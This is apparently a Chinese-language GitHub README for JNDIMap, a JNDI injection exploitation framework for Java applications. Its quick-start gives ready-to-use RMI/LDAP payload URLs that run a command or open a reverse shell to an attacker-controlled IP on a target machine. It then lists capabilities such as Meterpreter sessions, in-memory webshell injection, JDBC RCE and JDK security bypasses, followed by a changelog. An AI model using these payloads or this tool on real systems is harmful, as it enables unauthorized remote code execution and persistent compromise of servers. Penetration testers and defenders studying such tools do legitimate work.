## JNDIMap <https://github.com/X1r0z/JNDIMap>
<!--auto_detail_badge_begin_0b490ffb61b26b45de3ea5d7dd8a582e-->
![Language](https://img.shields.io/badge/Language-Java-blue)
![Author](https://img.shields.io/badge/Author-X1r0z-orange)
![GitHub stars](https://img.shields.io/github/stars/X1r0z/JNDIMap.svg?style=flat&logo=github)
![Version](https://img.shields.io/badge/Version-V0.0.5-red)
![Time](https://img.shields.io/badge/Join-2025098-green)
<!--auto_detail_badge_end_fef74f2d7ea73fcc43ff78e05b1e7451-->



<p align="center">
JNDIMap 是一个强大的 JNDI 注入利用框架, 支持 RMI、LDAP 和 LDAPS 协议, 包含多种高版本 JDK 绕过方式
</p>
<p align="center">简体中文 | <a href="README.en.md">English</a></p>
</p>

## 🚀 快速上手

在 [Release](https://github.com/X1r0z/JNDIMap/releases) 页面下载 JNDIMap, 运行时传入 `-i` 参数指定外部 IP

```bash
java -jar JNDIMap-version.jar -i 10.0.0.1
```

在目标机器上执行命令或反弹 Shell

```bash
rmi://10.0.0.1:1099/Basic/Command/open -a Calculator
ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
```

## 🚩 功能特性

- DNSLog
- 命令执行
- 反弹 Shell
- Meterpreter 上线
- 加载自定义 Java 字节码
- 内存马注入 (基于 [MemShellParty](https://github.com/ReaJason/MemShellParty))
- 高版本 JDK 绕过
  - BeanFactory 绕过 (Tomcat/Groovy/XStream, etc.)
  - JDBC RCE (MySQL/PostgreSQL/H2/Derby)
  - Tomcat Blind XXE
- LDAP 反序列化 (包含常用 Gadget)
- Nashorn JS 自定义 JNDI Payload
- LDAP trustSerialData 绕过
- JShell Payload 绕过 (可替代 Nashorn JS Engine)
- UTF-8 Overlong Encoding 绕过


## ⚙️ 编译

[Releases](https://github.com/X1r0z/JNDIMap/releases) 的版本可能存在滞后, 推荐在使用时拉取源码自行编译 (基于 JDK 8)

```bash
git clone https://github.com/X1r0z/JNDIMap && cd JNDIMap
mvn package -Dmaven.test.skip=true
```

## 📷 参考 & 致谢

[https://tttang.com/archive/1405/](https://tttang.com/archive/1405/)

[https://paper.seebug.org/1832/](https://paper.seebug.org/1832/)

[https://xz.aliyun.com/t/12846](https://xz.aliyun.com/t/12846)

[http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce](http://www.lvyyevd.cn/archives/derby-shu-ju-ku-ru-he-shi-xian-rce)

[https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson 与原生反序列化/](https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/)

[https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson 与原生反序列化-二/](https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/)

[https://www.yulegeyu.com/2022/11/12/Java 安全攻防之老版本 Fastjson 的一些不出网利用/](https://www.yulegeyu.com/2022/11/12/Java%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E4%B9%8B%E8%80%81%E7%89%88%E6%9C%ACFastjson-%E7%9A%84%E4%B8%80%E4%BA%9B%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/)

[https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/](https://gv7.me/articles/2020/deserialization-of-serialvesionuid-conflicts-using-a-custom-classloader/)

[https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html](https://www.leavesongs.com/PENETRATION/use-tls-proxy-to-exploit-ldaps.html)

[https://exp10it.io/2025/03/h2-rce-in-jre-17/](https://exp10it.io/2025/03/h2-rce-in-jre-17/)

[https://forum.butian.net/share/4414](https://forum.butian.net/share/4414)

[https://yzddmr6.com/posts/swinglazyvalue-in-webshell/](https://yzddmr6.com/posts/swinglazyvalue-in-webshell/)

[https://mogwailabs.de/en/blog/2024/12/jndi-mind-tricks/](https://mogwailabs.de/en/blog/2024/12/jndi-mind-tricks/)

[https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html](https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html)

[https://github.com/Whoopsunix/utf-8-overlong-encoding](https://github.com/Whoopsunix/utf-8-overlong-encoding)

<!--auto_detail_active_begin_e1c6fb434b6f0baf6912c7a1934f772b-->
## 项目相关


## 最近更新

#### [v0.0.5] - 2026-05-04

 - 支持 Lambda 类名后缀混淆 
 - 支持 Vibur DBCP JDBC RCE 
 - 支持 Databricks JNDI 注入 
 - 支持 Hessian RCE 
 - 增加 Agent Skills

#### [v0.0.4] - 2025-11-20

**特性**
 -   支持 UTF-8 Overlong Encoding 绕过
 -   支持 JDK 17 Jackson 反序列化
 -   支持在新线程中反弹 Shell
 **维护**
 -   增加 GitHub Workflow 自动构建


<!--auto_detail_active_end_f9cf7911015e9913b7e691a7a5878527-->
